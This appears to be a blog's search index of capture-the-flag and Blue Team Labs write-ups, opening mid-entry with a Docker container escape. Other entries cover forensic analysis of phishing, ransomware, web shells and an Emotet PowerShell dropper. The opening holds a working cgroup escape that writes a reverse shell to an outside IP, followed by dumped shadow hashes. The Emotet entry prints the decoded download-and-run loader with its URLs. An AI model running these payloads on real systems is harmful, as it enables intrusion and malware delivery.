gitlab_rails[&#39;initial_root_password&#39;]=File.read(&#39;/root_pass&#39;) networks: gitlab: ipv4_address: 172.19.0.2 ports: - &#39;5080:80&#39; #- &#39;127.0.0.1:5080:80&#39; #- &#39;127.0.0.1:50443:443&#39; #- &#39;127.0.0.1:5022:22&#39; volumes: - &#39;./srv/gitlab/config:/etc/gitlab&#39; - &#39;./srv/gitlab/logs:/var/log/gitlab&#39; - &#39;./srv/gitlab/data:/var/opt/gitlab&#39; - &#39;./root_pass:/root_pass&#39; privileged: true restart: unless-stopped #mem_limit: 1024mnetworks: gitlab: driver: bridge ipam: config: - subnet: 172.19.0.0/16Docker EscapeWe can leverage following payload to escalate privilegeshttps://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/mkdir /tmp/tmp2/cgrp &amp;amp;&amp;amp; mount -t cgroup -o rdma cgroup /tmp/tmp2/cgrp &amp;amp;&amp;amp; mkdir /tmp/tmp2/cgrp/xecho 1 &amp;gt; /tmp/tmp2/cgrp/x/notify_on_releasehost_path=`sed -n &#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p&#39; /etc/mtab`echo &quot;$host_path/cmd&quot; &amp;gt; /tmp/tmp2/cgrp/release_agentecho &#39;#!/bin/sh&#39; &amp;gt; /cmdecho &#39;bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.12/5555 0&amp;gt;&amp;amp;1&quot;&#39; &amp;gt;&amp;gt; /cmdchmod a+x /cmdsh -c &quot;echo \\$\\$ &amp;gt; /tmp/tmp2/cgrp/x/cgroup.procs&quot;;And we’re root on the host machine!!root@ready:/tmp# cat /etc/shadow | grep &#39;\\$&#39;cat /etc/shadow | grep &#39;\\$&#39;root:$6$6iCNjrc5M4h7KmBm$B.l0JheiUvsReXXIwMNIkebuk32EYFCs5pk4J9L8OoiD73IT5s639nPkncWI8R/5s9Vq9JvD2LAxMeQoBO9K6.:18452:0:99999:7:::dude:$6$CspweLQq29lopA9a$tbyLbtD6CSjNMv2jSEaJ9xRQFBl.C26cLu6HtuofggWqlZZHWUQ7LD8dta.D/CvFZYGT2TSvk90i6YYWdbIm5/:18450:0:99999:7:::" }, { "title": "(BTLO/Investigation) - Phishy v1", "url": "/posts/Phishy_v1/", "categories": "BlueTeamLabs, Security Operations", "tags": "Web Browser, Text Editor, Linux CLI", "date": "2022-05-26 06:00:00 +0200", "snippet": "You have been sent a phishing link. Sadly the threat actor doesn’t know who they were dealing with. From only one phishing link find out all you can about the person responsible and bring them to justice. CTF is hosted on https://blueteamlabs.online/Scenario You have been sent a phishing link. Sadly the threat actor doesn’t know who they were dealing with. From only one phishing link find out all you can about the person responsible and bring them to justice.IntroFirst of all after connecting to the machine, there’s a note that we’re supposed to read on the desktop.We’re supposed to visit the page mentioned, so let’s do that.There’s no HTTPS, CSS is poor, favicon.ico isn’t being loaded (which is weird since it’s supposed to be Microsoft’s O365 logon page). This should be some warn signals ;).One question is asking about the background image. We can grab that in the inspector just by finding the right image. What is the full URL of the background image which is on the phishing landing page? (3 points): http://securedocument.net/secure/L0GIN/protected/login/portal/axCBhIt.pngDiving deeperChecking the source code, there are other things that appear weird.Checking the jeff.php we can actually read the PHP code. What is the name of the php page which will process the stolen credentials? (3 points): jeff.php What email address is setup to receive the phishing credential logs? (3 points): boris.smets@tfl-uk.co What is the domain of the website which should appear once credentials are entered? (3 points): office.comWeb Page AnalysisIf we check the path beyond index1.html, we’ll see that directory listing is active.There’s aparently a .zip leftover there:One question is asking about the SHA256 hash of that .zip. What is the SHA256 of the phishing kit in ZIP format? (Provide the last 6 characters) (3 points): fa5b48If we check the root page, it’ll look like an error.But if we check the source, more information about the phishing page will be revealed. The HTML page used on securedocument.net is a decoy. Where was this webpage mirrored from, and what tool was used? (Use the first part of the tool name only) (4 points): 61.221.12.26/cgi-sys/defaultwebpage.cgi, HTTrackSource Code Analysis of the phishing pageLet’s unzip the codeindex1.html is actualy redirect from index.html What is the function called to produce the PHP variable which appears in the index1.html URL? (3 points): Date().getTime()There is an error in this phishing kit. What variable name is wrong causing the phishing site to break? (Enter any of 4 potential answers)Problem is in the form, which sends variables with other names as expected from jeff.php causing PHP code to break. Answer: userrr" }, { "title": "(BTLO/Challenge) - The Planet&#39;s Prestige / Email Analysis", "url": "/posts/The_Planets_Prestige/", "categories": "BlueTeamLabs, CTF-Like", "tags": "Email Analysis, exiftool, XML-Parsing", "date": "2022-05-25 06:00:00 +0200", "snippet": "It’s all about an Email Analysis with small CTF-y part CTF is hosted on https://blueteamlabs.online/ Scenario CoCanDa, a planet known as ‘The Heaven of the Universe’ has been having a bad year. A series of riots have taken place across the planet due to the frequent abduction of citizens, known as CoCanDians, by a mysterious force. CoCanDa’s Planetary President arranged a war-room with the best brains and military leaders to work on a solution. After the meeting concluded the President was informed his daughter had disappeared. CoCanDa agents spread across multiple planets were working day and night to locate her. Two days later and there’s no update on the situation, no demand for ransom, not even a single clue regarding the whereabouts of the missing people. On the third day a CoCanDa representative, an Army Major on Earth, received an email. IntroFor this investigation, i’ll follow the questions sprovided by BTLO.I’ll be using Sublime Text in Sift WorkstationVM with Email Header (https://packagecontrol.io/packages/Email%20Header) plugin, to get some highlighting on headers.There are many header present in Email messages being sent. Some are standardized (https://www.iana.org/assignments/message-headers/message-headers.xhtml) and some are experemental or extended and they have X- prepended.Now let’s begin.The BeginningThe topmost Recieved Header is the one closest to destination, where the lowest one is closer to the sender. Apparently client was using postfix which is why we nee to look in the second Recieved header in the middle on line 28. What is the email service used by the malicious actor? (1 points): emkei.czTHE interessting headersLet’s take the look to different headers for the sake of learningReply-To When the “Reply-To:” field is present, it indicates the mailbox(es) to which the author of the message suggests that replies be sent. Link: https://datatracker.ietf.org/doc/html/rfc4021#page-8 What is the Reply-To email address? (2 points): negeja3921@pashter.comErrors-To A bounce address is an email address to which bounce messages are delivered. There are many variants of the name, none of them used universally, including return path, reverse path, envelope from, envelope sender, MAIL FROM, 5321-FROM, return address, From_, Errors-to, etc. It is not uncommon for a single document to use several of these names. Link: https://en.wikipedia.org/wiki/Bounce_addressReturn-Path Return path for message response diagnostics. Link: https://datatracker.ietf.org/doc/html/rfc4021#page-17Received-SPF: fail and Authentication-ResultsWe can that Recieved-SPF returns a failGoogle.com has a DNS TXT record set with SPF information in it which basically states what is allowed and what not.Digging deeper in SPFSo let’s manually check the SPF policy from google.com.sansforensics@siftworkstation: ~/Desktop/cases_CTF$ dig google.com txt | grep spfgoogle.com. 5 IN TXT &quot;v=spf1 include:_spf.google.com ~all&quot;First DNS TXT record of google.com says we need to check _spf.google.com so let’s do that.sansforensics@siftworkstation: ~/Desktop/cases_CTF$ dig _spf.google.com txt | grep spf; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.10.3-P4-Ubuntu &amp;lt;&amp;lt;&amp;gt;&amp;gt; _spf.google.com txt;_spf.google.com. IN TXT_spf.google.com. 5 IN TXT &quot;v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all&quot;Now we get more information where the Emails from google.com should actually come from. v=spf1 tells us a version include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com is the actual policy. We can resolve the _netblocks simply by asking DNS sansforensics@siftworkstation: ~/Desktop/cases_CTF$ dig _netblocks.google.com txt | grep spf_netblocks.google.com. 5 IN TXT &quot;v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all&quot; ~all means that all other senders should be disallowed.If we check the senders Email, we’d see that it does not come from allowed IP range, hence failAttachmentsAttachments are attached to the Emails like documents are send over HTTP POST Requests. Filename actually says it’s PDF but if we copy whole Base64, decode it and save it to the filename…echo UEsDBBQAAAAIb0NhbkRhL0RhdWdodGVyc0Nyb3du7XpnVBNKu27oXURBihQRpIUmTUKLoICg9BLpIkqV3ntRQCI....CLIP....&quot; | base64 -d | filename…and run a file comand on it it would return ZIP-File What is the filetype of the received attachment which helped to continue the investigation? (1 points): .zipIf we unpack the attachment we get 3 Files, a JPEG, PDF and XLSX.… and here is where CTF-y part begins.The CTF-y partRunning exiftoolWe can find the author running exiftool on the PDF file. What is the name of the malicious actor? (2 points): Pestero NegejaAnalyzing XLSX and Parsing XML.xlsx can be unzipped as any other .zip file.Checking files in unzipped, i’ve found following textDecoding the Base64 we can find location that BTLO is asking forsansforensics@siftworkstation: ~/Desktop/cases_CTF/CoCanDa/PuzzleToCoCanDa/xl$ echo &quot;VGhlIE1hcnRpYW4gQ29sb255LCBCZXNpZGUgSW50ZXJwbGFuZXRhcnkgU3BhY2Vwb3J0Lg==&quot; | base64 -d &amp;amp;&amp;amp; echo &quot;&quot;The Martian Colony, Beside Interplanetary Spaceport. What is the location of the attacker in this Universe? (2 points): The Martian Colony, Beside Interplanetary SpaceportThe Last questionIt’s might be pashter.com. What could be the probable C&amp;amp;C domain to control the attacker’s autonomous bots? (2 points): pashter.comReferenceshttps://packagecontrol.io/packages/Email%20Headerhttps://www.iana.org/assignments/message-headers/message-headers.xhtmlhttps://en.wikipedia.org/wiki/Bounce_addresshttps://datatracker.ietf.org/doc/html/rfc4021#page-17https://gnome.pages.gitlab.gnome.org/libxml2/xmllint.html" }, { "title": "(BTLO/Challenge) - Suspicious USB Stick", "url": "/posts/Suspicious_USB_Stick/", "categories": "BlueTeamLabs, Digital Forensics", "tags": "XXD, strings, VirusTotal, yara", "date": "2022-05-23 13:00:00 +0200", "snippet": "One of our clients informed us they recently suffered an employee data breach…can you check the contents on the USB drive? CTF is hosted on https://blueteamlabs.online/ Scenario One of our clients informed us they recently suffered an employee data breach. As a startup company, they had a constrained budget allocated for security and employee training. I visited them and spoke with the relevant stakeholders. I also collected some suspicious emails and a USB drive an employee found on their premises. While I am analyzing the suspicious emails, can you check the contents on the USB drive? Unzip the contents. I’ll be using SIFT Workstation from SANS: https://www.sans.org/tools/sift-workstation/sansforensics@siftworkstation: ~/Desktop/cases_CTF/BTLO Suspicious USB$ unzip USB.zip Archive: USB.zip creating: USB/ creating: USB/autorun/[USB.zip] USB/autorun/autorun.inf password: extracting: USB/autorun/autorun.inf inflating: USB/autorun/README.pdf Digital Forensics - the BeginningAutorun.inf runs README.pdf which obviously isn’t nice thing to do.sansforensics@siftworkstation: ~/Desktop/cases_CTF/BTLO Suspicious USB/USB$ cat autorun/autorun.inf [autorun]open=README.pdficon=autorun.icoMore info here:https://en.wikipedia.org/wiki/Autorun.inf In short, Autorun.inf autoruns components on Windows OS. What file is the autorun.inf running? (3 points): README.pdfUpload README.pdf to VirusTotalUploading file to VirusTotal shows that file is most likely malicious:(I had to use version for old-browsers, but it’s still VirusTotal) Does the pdf file pass virustotal scan? (No malicious results returned) (2 points): FalseChecking Magic BytesComparing magic bytes reveals that file is indeed a PDF as it claims to beLink: https://en.wikipedia.org/wiki/List_of_file_signatures What OS type can the file exploit? (Linux, MacOS, Windows, etc) (5 points): WindowsChecking for command Execution in PDFSimple search for exe reveals that PDF should execute cmd.exe A Windows executable is mentioned in the pdf file, what is it? (3 points): cmd.exePDF contains one OpenAction. How many suspicious /OpenAction elements does the file have? (5 points): 1Further AnalysisYara Scan with Maldoc_PDF.yarsansforensics@siftworkstation: ~/Desktop/cases_CTF/BTLO Suspicious USB/USB/autorun$ yara -w /home/sansforensics/tools/rules/maldocs/Maldoc_PDF.yar README.pdf suspicious_launch_action README.pdfsuspicious_embed README.pdfmultiple_versions README.pdfPDF_Embedded_Exe README.pdf" }, { "title": "(BTLO/Challenge) - Network Analysis - Web Shell", "url": "/posts/Network_Analysis-Web_Shell/", "categories": "BlueTeamLabs, Incident Response", "tags": "Wireshare, TCPDump", "date": "2022-05-23 13:00:00 +0200", "snippet": "The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. CTF is hosted on https://blueteamlabs.online/ Scenario The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Downloading the PCAP FileWhen downloading you should not extract the PCAP and replay it or something like that as PCAP contains real malware, at least that’s what warning says on BTLO! :)Anyways let’s get going.Finding PortScanAfter opening the PCAP and checking Statistics, it’s obvious that there is one IP that appears to be running port scan.Packets are almost the same lenght and destination ports are random and in lower range. We can sort on low/high ports just by clicking on Port B in my case. If there were other IPs involved, we might need to filter on IP first. What is the IP responsible for conducting the port scan activity? (1 points): 10.251.96.4 What is the port range scanned by the suspicious host? (1 points): 1-1024Diving deeperIn order what kind of scan it is, we can follow TCP flow and as it appears it’s TCP with just SYN flag set. What is the type of port scan conducted? (1 points): TCP SYNTo actually get which ports are open, we can assume that more packets were sent between victim and the client. Just by checking Statistics, this appear to be the 22, 80. Perhaps worth mentioning, there was communication to 4422 (from victim to attackers machine!)Finding TTPsAs many tools use specific UserAgent Headers, they will stand out if we focus on them. To get User Agent as a column, just right-click it on any http packet and choose Apply as a Column. Beforehand i filtered on TCP.PORT, IP.SRC and HTTP(tcp.port==80 &amp;amp;&amp;amp; http) &amp;amp;&amp;amp; (ip.src == 10.251.96.4) Two more tools were used to perform reconnaissance against open ports, what were they? (1 points): gobuster 3.0.1, sqlmap 1.4.7Initial Foothold analysisAttacker used editprofile.php which most probably triggered form upload.php. Actual commands were executed in /uploads/dbfunctions.php What is the name of the php file through which the attacker uploaded a web shell? (1 points): editprofile.php What is the name of the web shell that the attacker uploaded? (1 points): dbfunctions.php What is the parameter used in the web shell for executing commands? (1 points): cmd What is the first command executed by the attacker? (1 points): id What is the type of shell connection the attacker obtains through command execution? (1 points): reverse shell What is the port he uses for the shell connection? (1 points): 4422Checking the packet 16102 which sent upload.php we can see what uploaded file was:" }, { "title": "(BTLO/Challenge) - Memory Analysis - Ransomware", "url": "/posts/Memory_Analysis-Ransomware/", "categories": "BlueTeamLabs, Digital Forensics", "tags": "Volatility, Ransomware, WannaCry", "date": "2022-05-23 13:00:00 +0200", "snippet": "The Account Executive called the SOC earlier and sounds very frustrated and angry. He stated he can’t access any files on his computer and keeps receiving a pop-up stating that his files have been encrypted. CTF is hosted on https://blueteamlabs.online/ Scenario The Account Executive called the SOC earlier and sounds very frustrated and angry. He stated he can’t access any files on his computer and keeps receiving a pop-up stating that his files have been encrypted. You disconnected the computer from the network and extracted the memory dump of his machine and started analyzing it with Volatility. Continue your investigation to uncover how the ransomware works and how to stop it! I’ll be using SIFT Workastation from SANS. https://www.sans.org/tools/sift-workstation/Forensics - The BeginingAt first, we get a .mem file which we can easily read with volatility and this is also what we’re expected to do. Run “vol.py -f infected.vmem –profile=Win7SP1x86 psscan” that will list all processes. What is the name of the suspicious process? (3 points): @WanaDecryptor@WanaDecryptor definately sticks out here, along with or4qtckT.exe. Checking PPID 2732 of @WanaDecryptor.Googling the Filenames reveals what the Ransoware should be Can you identify what ransomware it is? (Do your research!) (2 points): WannaCryChecking the Process Tree it becomes more obvious What is the parent process ID for the suspicious process? (3 points): 2732 What is the initial malicious executable that created this process? (3 points): or4qtckT.exeWe can also get graphical view of process tree including exited processessansforensics@siftworkstation: ~/Desktop/cases_CTF/BTLO Memory Analysis - Ransomware$ vol.py -f infected.vmem --profile=Win7SP1x86 psscan --output dot --output-file psscan.dotVolatility Foundation Volatility Framework 2.6Outputting to: psscan.dotsansforensics@siftworkstation: ~/Desktop/cases_CTF/BTLO Memory Analysis - Ransomware$ dot -Tpng psscan.dot -o psscan.png![](/assets/images/2022-05-23-18-35-30.png)&amp;gt; If you drill down on the suspicious PID (vol.py -f infected.vmem --profile=Win7SP1x86 psscan | grep (PIDhere)), find the process used to delete files (3 points): `taskdl.exe`Taking deeper look - handles / dlllistUsing dlllist module with the process should reveal loaded libraries and .exe0 Find the path where the malicious file was first executed (3 points): C:\\Users\\hacker\\Desktop\\or4qtckT.exeChecking handles reveals the .eky file which is encrypted private key with embeded public key. What is the filename for the file with the ransomware public key that was used to encrypt the private key? (.eky extension) (3 points): 00000000.ekyCmdlineThanks for reading!Resourcehttps://resources.infosecinstitute.com/topic/ransomware-analysis-with-volatility/https://www.sans.org/tools/sift-workstation/" }, { "title": "(BTLO/Investigation) - Total Recall", "url": "/posts/Total_Recall/", "categories": "BlueTeamLabs, Incident Response", "tags": "Redline", "date": "2022-05-22 18:33:00 +0200", "snippet": "Microsoft Defender Antivirus has been there for over a decade now. It provides security against known threats until it has not been tampered with. CTF is hosted on https://blueteamlabs.online/ Scenario Unfortunately an Account Executive was just got let go from the company due to downsizing efforts. Before wiping his machine to be reissued in the future a threat hunter wants to conduct memory analysis after other suspicious activity was observed coming from the user in question before his termination was confirmed.Hopefully there’s nothing bad, but this could be an incident waiting to be discovered. See if you can find any malicious activity on their system. InstructionsRedline investigationChecking usersFirst of all let’s try to get some basic info like existing users:There are many users but apparently only Jason and hacker have been recently logged in. We should note us this two. Both are members of Administrators group and Jason is also member of Remote Desktop Users. Checking for RDP events we can also see that Firewall rule was changed What service was enabled by the attacker between 7-8 PM on 03/03/2021 which involves the netsh command and exception on the firewall? Provide the protocol and execution PID(5 points): RDP, 1028Other users were created which can be seen in event logs searching for 4720 Event ID What user accounts were created by the insider? (alphabetical order)(5 points): Alice, Bob, Carlos, Jason, SmithChecking browser historyThere are few interesting entries like, we get account which might be from attacker (or not, but it could be right?).We also see that WinPwnage (https://github.com/rootm0s/WinPwnage) was visited.Let’s check downloads: The user tried to download an .exe file to the system but cancelled it. What was the filename?(5 points): Openvpn (1).exe What is the IP and port used to download other files to the system?(5 points): 10.201.1.105:8080Checking TasksChecking the Tasks, there are two interesting entries as it can be seen below. The task will grab the file from the attacker’s machine. What file is scheduled to run on the tasks? Include the full path to the file within the URL(5 points): http://10.201.1.105:8080/catchmeifyoucan.exe Both powershell Tasks have names as DailyTask and OnIdleTask and will be trigered at Logon or on Idle status. Can you find two scheduled tasks created by the malicious insider? (alphabetical order)(5 points): DailyTask, OnIdleTask What is the time creation for these scheduled tasks? (alphabetical order)(5 points): 2021-03-03 21:41:23Z, 2021-03-03 21:43:08ZTask creation can be found in Timeline. I think it’s the easiest way to search.Checking servicesIf we remove all Microsoft signed binaries we get short list of services.Aparently there is Meterpreter service which is pretty much self-explainatoryWe know the file name: C:\\Users\\hacker\\AppData\\Local\\Temp\\OHpObWvB\\metsvc.exe. Another common persistence method is using Windows Services. Identify any suspicious running services(5 points): C:\\Users\\hacker\\AppData\\Local\\Temp\\OHpObWvB\\metsvc.exe, 31337Checking RegistryThere’s an entry in registry (checking manually), which runs UserInit.exe and evil.exe on logon. The insider has likely utilized ATT&amp;amp;CK ID T1547.001 to obtain persistence. Find the malicious registry entry and submit the Registry Key Value and modified date(5 points): Userinit.exe, evil.exe, 2021-03-07 11:15:29Z An attempt was made to reset a newly-created user’s password some time after 9 PM on 03/03/2021. Find the Execution PID and Execution Thread ID(5 points): 472, 2872" }, { "title": "(BTLO/Challenge) - Malicious PowerShell Analysis", "url": "/posts/Malicious_PowerShell_Analysis/", "categories": "BlueTeamLabs, Incident Response", "tags": "PowerShell, CyberChef, Malware", "date": "2022-05-19 18:33:00 +0200", "snippet": "Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware.Scenario Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack?Downloading Powershell FileFor this challenge, we don’t actually get an access to a box, but just a simple powershell file that we have to download to disk. It’s a simple PS command and we have to investigate what it does.Basic Base64 DeobfuscationLet’s copy and paste command into Cyberchef (https://gchq.github.io/CyberChef/) and set the filters “From Base64” and “Decode text” with “UTF-16LE”.Doing that we can actually see the command:So we can see some code there, but it’s still pretty unreadable. Let’s throw Generic Code Beautify in there.Analyzing level of obfuscationSo we can see few techniques that were used for obfuscating this code.Random CaseIt’s actualy all over.... sEt MKu ...We could use ToLowerCase which might break the code but increase readability.I will use this with caution and might disable it.BackticksExample:do`wnl`oad`fileLet’s use Find/Replace for this one.So strings, especially longer ones, are getting more readable.DiscatenationExampleadm&#39; + &#39;int&#39; + &#39;k.c&#39; + &#39;o&#39; + &#39;m/&#39; + &#39;w&#39;Since there are more different patterns i’ve had a hard time to find a right balance which signs to take away in order to not to break the code to much. This is no fancy regex, but it has made the code a little bit more readable.Reorder[type](&quot;{0}{1}{2}{4}{3}&quot; -f &#39;syst&#39;,&#39;em.&#39;,&#39;io.di&#39;,&#39;ory&#39;,&#39;rect&#39;)As there are only two occurences i’ll reverse the strings using powershell and put the strings back into the code.PS C:\\&amp;gt; echo (&quot;{0}{1}{2}{4}{3}&quot; -f &#39;syst&#39;,&#39;em.&#39;,&#39;io.di&#39;,&#39;ory&#39;,&#39;rect&#39;) | out-stringsystem.io.directoryPS C:\\&amp;gt; echo (&quot;{6}{8}{0}{3}{4}{5}{2}{7}{1}&quot; -f&#39;stem&#39;,&#39;ger&#39;,&#39;ma&#39;,&#39;.n&#39;,&#39;et.servicepoi&#39;,&#39;nt&#39;,&#39;s&#39;,&#39;na&#39;,&#39;y&#39;)system.net.servicepointmanagerManually “cleaning” the rest of the code.This is what i have nowI’ll clean few other spotsAscii character conversions[char]92This ones can be simply put into powershellAfter cleaning some parentshesis manually this is what i’ve ended up withset mku([type](system.io.directory));set-item(&#39;variable:mbu&#39;)[type](system.net.servicepointmanager);$erroractionpreference = ((&#39;silentlycontinue&#39;));$cvmmq4o = $q26l + &quot;@&quot; + $e16h;$j16j = &#39;n_0p&#39;;(dir variable:mku).value::&quot;createdirectory&quot;($home + ((&#39;{0}db_bh30{0}yf5be5g{0}&#39;) -f &quot;\\&quot;));$c39y = &#39;u68s&#39;;(variable(&quot;mbu&quot;) -valueon )::&quot;securityprotocol&quot; = (&#39;tls12&#39;));$f35i = &#39;i4_b&#39;;$swrp6tc = &#39;a69s&#39;;$x27h = &#39;c33o&#39;;$imd1yck = $home + (&#39;uohdb_bh30uohyf5be5guoh&#39;).&quot;replace&quot;(&#39;uoh&#39;, &quot;\\&quot;) + $swrp6tc + &#39;.dll&#39;;$k47v = &#39;r49g&#39;;$b9fhbyv = (&#39;]anw[3s://admintk.com/wp-admin/l/@]anw[3s://mikegeerinck.com/c/yysa/@]anw[3://freelancerwebdesignerhyderabad.com/cgi-bin/s/@]anw[3://etdog.com/wp-content/nu/@]anw[3s://www.hintup.com.br/wp-content/de/@]anw[3://www.stmarouns.nsw.edu.au/paypal/b8g/@]anw[3://wm.mcdevelop.net/content/6f2gd/&#39;).&quot;replace&quot;(&#39;]anw[3&#39;, ([array](&#39;sd&#39;, &#39;sw&#39;), &#39;http&#39;, &#39;3d&#39;)[1]).&quot;split&quot;($c83r + $cvmmq4o + $f10q);$q52m = &#39;p05k&#39;;foreach ($bm5pw6z in $b9fhbyv) { try { (&amp;amp;(&#39;new-object&#39;) system.net.webclient).&quot;downloadfile&quot;($bm5pw6z, $imd1yck); $z10l = (&#39;a92q&#39;); if ((&amp;amp;(&#39;get-item&#39;) $imd1yck).&quot;length&quot; - ge 35698) { &amp;amp;(&#39;rundll32&#39;) $imd1yck, ((&#39;control_rundll&#39;).&quot;tostring&quot;(); $r65i = (&#39;z09b&#39;)); break; $k7_h = (&#39;f12u&#39;) } } catch {}}$w54i = &#39;v95o&#39;Replacing the Replace function manuallyNow let’s replace the Replace functionHere$imd1yck = $home + (&#39;uohdb_bh30uohyf5be5guoh&#39;).&quot;replace&quot;(&#39;uoh&#39;, &quot;\\&quot;) + $swrp6tc + &#39;.dll&#39;;Which becomes$imd1yck = $home + &#39;\\db_bh30\\yf5be5g\\&#39; + $swrp6tc + &#39;.dll&#39;And second string:(&#39;]anw[3s://admintk.com/wp-admin/l/@]anw[3s://mikegeerinck.com/c/yysa/@]anw[3://freelancerwebdesignerhyderabad.com/cgi-bin/s/@]anw[3://etdog.com/wp-content/nu/@]anw[3s://www.hintup.com.br/wp-content/de/@]anw[3://www.stmarouns.nsw.edu.au/paypal/b8g/@]anw[3://wm.mcdevelop.net/content/6f2gd/&#39;).&quot;replace&quot;(&#39;]anw[3&#39;, ([array](&#39;sd&#39;, &#39;sw&#39;), &#39;http&#39;, &#39;3d&#39;)[1]).&quot;split&quot;($c83r + $cvmmq4o + $f10q)Gives as an array of URLs. First ]anw[3 gets replaces by http and then split happens with a @ which is saved in $cvmmq4o.We end up with simple array.$b9fhbyv = &#39;https://admintk.com/wp-admin/l/&#39;,&#39;https://mikegeerinck.com/c/yysa/&#39;,&#39;http://freelancerwebdesignerhyderabad.com/cgi-bin/s/&#39;,&#39;http://etdog.com/wp-content/nu/&#39;,&#39;https://www.hintup.com.br/wp-content/de/&#39;,&#39;http://www.stmarouns.nsw.edu.au/paypal/b8g/&#39;,&#39;http://wm.mcdevelop.net/content/6f2gd/&#39;Now our command looks like thisset mku([type](system.io.directory));set-item(&#39;variable:mbu&#39;)[type](system.net.servicepointmanager);$erroractionpreference = &#39;silentlycontinue&#39;;$cvmmq4o = $q26l + &quot;@&quot; + $e16h;$j16j = &#39;n_0p&#39;;(dir variable:mku).value::&quot;createdirectory&quot;($home + &#39;\\db_bh30\\yf5be5g\\&#39;);$c39y = &#39;u68s&#39;;(variable(&quot;mbu&quot;) -valueon)::&quot;securityprotocol&quot; = &#39;tls12&#39;;$f35i = &#39;i4_b&#39;;$swrp6tc = &#39;a69s&#39;;$x27h = &#39;c33o&#39;;$imd1yck = $home + &#39;\\db_bh30\\yf5be5g\\a69s.dll&#39;;$k47v = &#39;r49g&#39;;$b9fhbyv = &#39;https://admintk.com/wp-admin/l/&#39;,&#39;https://mikegeerinck.com/c/yysa/&#39;,&#39;http://freelancerwebdesignerhyderabad.com/cgi-bin/s/&#39;,&#39;http://etdog.com/wp-content/nu/&#39;,&#39;https://www.hintup.com.br/wp-content/de/&#39;,&#39;http://www.stmarouns.nsw.edu.au/paypal/b8g/&#39;,&#39;http://wm.mcdevelop.net/content/6f2gd/&#39;$q52m = &#39;p05k&#39;;foreach ($bm5pw6z in $b9fhbyv) { try { (&amp;amp;(&#39;new-object&#39;) system.net.webclient).&quot;downloadfile&quot;($bm5pw6z, $imd1yck); $z10l = (&#39;a92q&#39;); if ((&amp;amp;(&#39;get-item&#39;) $imd1yck).&quot;length&quot; - ge 35698) { &amp;amp;(&#39;rundll32&#39;) $imd1yck, (&#39;control_rundll&#39;).&quot;tostring&quot;(); $r65i = &#39;z09b&#39;; break; $k7_h = &#39;f12u&#39; } } catch {}}$w54i = &#39;v95o&#39;Determening MalwareSimple google search point as to MalwareBazaarIf we check inteligence data we see it’s probably related to Emotet FamilyAnswering QuestionsPlease note that i’ve used ToLowerCase function and as this helps with readability, it also impacts file and directory names! What security protocol is being used for the communication with a malicious domain? TLS 1.2 What directory does the obfuscated PowerShell create? (Starting from \\HOME) \\home\\db_bh30\\yf5be5g\\ What file is being downloaded (full name)? a69s.dll What is used to execute the downloaded file? rundll32 What is the domain name of the URI ending in ‘/6F2gd/’? wm.mcdevelop.net Based on the analysis of the obfuscated code, what is the name of the malware? EmotetReferencehttps://malware.news/t/deobfuscating-powershell-putting-the-toothpaste-back-in-the-tube/23509" }, { "title": "(BTLO/Security Operations) - Defaced", "url": "/posts/Defaced/", "categories": "BlueTeamLabs, Security Operations", "tags": "ELK", "date": "2022-04-08 18:33:00 +0200", "snippet": "After his pharmaceutical website was compromised, had the database dumped and the homepage defaced, Mike decided it was time to take security seriously and investigate what happened to prevent it in the future.ScenarioIntroAfter machine has booted, we may login into ELK by opening bookmark in Chrome. We should adjust the date to match approximately the one of the incident.Now as we know that files were changed and tool was installed for that purpose - to track the changes, we should check that. BTLO has provided screenshots:What can we see? Logs were deleted from the system index.html was added to the system (probably changed the background of hacked.png) - this is an assumption backdoor.jpg.php was added to the system which may be some kind of reverse shell or script for command execution.QuestionsAs an analyst, you need to submit details to the CTI team. What is the signature left by the threat actor that compromised the website?Important piece of information if we would like to chat TTPs as well. This info can be found on the defaced homepage (saved in After.JPG) Answer: Team ApashKirikiri2.0The attacker deleted some files. What are they?This can be seen in the screenshot above with an output of the integrity tool. Attacker deleted access and error logs of the web server. Answer: access_log, error_logWhat is the scanner used by the attacker to identify the vulnerability?I haven’t found any way to find a straightforward answer here. It was more like educated guess and search for message:*nikto* does bring results. There might be a better way, but i haven’t found it. UserAgent is empty, just for the record ;). Answer: niktoWhich PHP page is vulnerable to Remote File Inclusion (RFI)? Answer: getimagesonly.phpWhat is the IP address of the remote attacker?(Check the screenshot above) Answer: 91.192.103.35What is the name of the PHP shell?(Check the screenshot above) Answer: backdoor.jpg.phpThe attacker downloaded the PHP shell from a file-hosting website. What is the name of the website?(Check the screenshot above) Answer: mediafire.comWhat time was the first command executed through the PHP shell?Command is not hard to spot in the screenshot above, however the question does not expect the normalized time, so we need to enter the actual time of event. Answer: 18/02/2021 17:12:44Which config file does the attacker attempt to read using the command ‘cat’? Answer: /opt/lampp/htdocs/MikePharmaSystem/config.phpAt what time was the database dumped by the attacker?Assumption is that attacker has got credentials to phpmyadmin. Checking the Logs confirms that.To actually get the time we need to open the log to get actual time and not the normalized one. Answer: 18/02/2021 17:14:59The attacker exfiltrated the database records. What is the database name?(Check the screenshot above) Answer: Mike_Pharmaceuticals" }, { "title": "Miner", "url": "/posts/Miner/", "categories": "BlueTeamLabs, Incident Response", "tags": "Network Miner, Wireshark", "date": "2022-04-08 18:33:00 +0200", "snippet": "Our detection team reported that they receive an IDS alert related to reconnaissance but they were unable to read the traffic as it was encrypted. Pcap files and analysis tools are available on the Desktop.Scenario Our detection team reported that they receive an IDS alert related to 